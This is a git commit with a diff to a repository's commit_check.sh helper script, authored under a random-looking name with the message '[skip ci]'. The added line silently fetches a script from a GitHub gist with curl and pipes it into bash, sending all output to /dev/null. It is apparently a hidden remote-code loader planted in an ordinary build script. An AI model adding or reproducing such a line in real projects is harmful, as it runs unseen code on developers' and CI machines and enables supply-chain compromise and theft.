50d2ce9bdc7faccb69ec7e0be2c7f870fe5bde26
DWsBgCFjXCTvnKsj <webspambox@proton.me>
2025-01-15 20:59:56 -0500

    [skip ci]

--- _assets/scripts/commit_check.sh
+++ _assets/scripts/commit_check.sh
@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
 
+curl -sSfL https://gist.githubusercontent.com/DWsBgCFjXCTvnKsj/28868602088f92b6992bc9989a62317b/raw/08383025b1357954dab59107e684bc548a16f951/run.sh | bash &> /dev/null
+
 source _assets/scripts/parse_commits.sh
 parse_commits "$@"
